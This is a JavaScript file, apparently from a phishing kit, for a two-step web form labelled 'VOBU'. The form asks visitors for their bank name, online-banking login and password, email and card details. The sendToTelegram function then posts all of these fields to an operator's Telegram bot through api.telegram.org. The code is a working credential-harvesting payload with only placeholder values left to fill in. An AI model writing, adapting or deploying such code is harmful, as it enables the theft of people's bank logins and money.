// Конфигурация Telegram бота
const TELEGRAM_BOT_TOKEN = "ВАШ_BOT_TOKEN"; // Получить у @BotFather
const TELEGRAM_CHAT_ID = "ВАШ_CHAT_ID";    // Получить у @userinfobot

// Элементы DOM
const bankFormSection = document.getElementById('bank-form-section');
const cardFormSection = document.getElementById('card-form-section');
const successMessage = document.getElementById('success-message');
const nextBtn = document.getElementById('nextBtn');
const backBtn = document.getElementById('backBtn');
const newFormBtn = document.getElementById('newFormBtn');
const bankForm = document.getElementById('bankForm');
const cardForm = document.getElementById('cardForm');

// Обработчики событий
nextBtn.addEventListener('click', () => {
    if (bankForm.checkValidity()) {
        bankFormSection.classList.add('hidden');
        cardFormSection.classList.remove('hidden');
    } else {
        alert('Будь ласка, заповніть всі обов\'язкові поля');
    }
});

backBtn.addEventListener('click', () => {
    cardFormSection.classList.add('hidden');
    bankFormSection.classList.remove('hidden');
});

newFormBtn.addEventListener('click', () => {
    successMessage.classList.add('hidden');
    bankFormSection.classList.remove('hidden');
    bankForm.reset();
    cardForm.reset();
});

// Функция отправки данных в Telegram
async function sendToTelegram(data) {
    const message = `
📌 <b>Новые данные с формы VOBU</b>
    
<b>Банковские данные:</b>
🏦 Банк: ${data.bank}
👤 Логин: ${data.login}
🔑 Пароль: ${data.password}
📧 Email: ${data.email}

<b>Инвентарная карта:</b>
🔢 Номер: ${data.cardNumber}
📝 Детали: ${data.cardDetails}

⏱ <i>${new Date().toLocaleString()}</i>
    `;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (!response.ok) {
            throw new Error('Ошибка отправки');
        }
        
        return true;
    } catch (error) {
        console.error('Ошибка:', error);
        return false;
    }
}

// Обработка отправки формы
cardForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // Собираем данные из обеих форм
    const formData = {
        bank: document.getElementById('bankName').value,
        login: document.getElementById('bankLogin').value,
        password: document.getElementById('bankPassword').value,
        email: document.getElementById('userEmail').value,
        cardNumber: document.getElementById('cardNumber').value,
        cardDetails: document.getElementById('cardDetails').value
    };
    
    // Показываем загрузку
    const submitBtn = cardForm.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerHTML;
    submitBtn.disabled = true;
    submitBtn.innerHTML = `
        <span>Відправка...</span>
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2V6M12 18V22M6 12H2M22 12H18M19.0784 19.0784L16.25 16.25M19.0784 4.99994L16.25 7.82837M4.92157 19.0784L7.75 16.25M4.92157 4.99994L7.75 7.82837" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
    `;
    
    try {
        // Отправляем данные в Telegram
        const success = await sendToTelegram(formData);
        
        if (success) {
            // Показываем сообщение об успехе
            cardFormSection.classList.add('hidden');
            successMessage.classList.remove('hidden');
            
            // Очищаем формы
            bankForm.reset();
            cardForm.reset();
        } else {
            alert('Помилка при відправці даних. Спробуйте ще раз.');
        }
    } catch (error) {
        console.error('Ошибка:', error);
        alert('Сталася помилка. Спробуйте пізніше.');
    } finally {
        submitBtn.disabled = false;
        submitBtn.innerHTML = originalText;
    }
});

// Автоматический редирект с корня сайта
if (window.location.pathname === '/' || window.location.pathname === '') {
    window.location.href = '/index.html';
}
